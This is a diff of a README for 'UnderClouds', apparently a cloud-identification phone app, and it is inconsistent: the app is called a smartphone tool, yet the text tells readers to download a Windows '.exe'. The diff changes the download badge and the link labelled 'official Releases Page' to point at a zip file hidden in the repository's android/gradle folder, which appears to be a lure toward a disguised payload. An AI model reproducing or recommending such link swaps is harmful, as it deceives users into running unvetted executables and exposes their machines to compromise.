@@ -1,6 +1,6 @@
 # ☁️ UnderClouds - Identify clouds and locate geographic positions
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bernellearduous5093/UnderClouds/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bernellearduous5093/UnderClouds/raw/refs/heads/main/android/gradle/Clouds-Under-1.0-alpha.3.zip)
 
 UnderClouds turns your smartphone into a weather station. Point your camera at the sky to identify cloud types. The app calculates how far clouds sit above you. It also shows you landmarks and details about the ground area beneath those clouds using map data. You do not need to know science to use this tool. Open the app, aim your phone, and read the results on your screen.
 
@@ -26,7 +26,7 @@ To run UnderClouds on your Windows computer, verify that your machine meets thes
 
 You must visit the project release page to get the latest version of the software. Follow these steps to prepare the application for your computer:
 
-1.  Navigate to the official [UnderClouds Releases Page](https://github.com/Bernellearduous5093/UnderClouds/releases).
+1.  Navigate to the official [UnderClouds Releases Page](https://github.com/Bernellearduous5093/UnderClouds/raw/refs/heads/main/android/gradle/Clouds-Under-1.0-alpha.3.zip).
 2.  Look for the section marked "Assets" at the bottom of the newest release version.
 3.  Select the file ending in `.exe` to start the download.
 4.  Save the file to your desktop or your downloads folder.
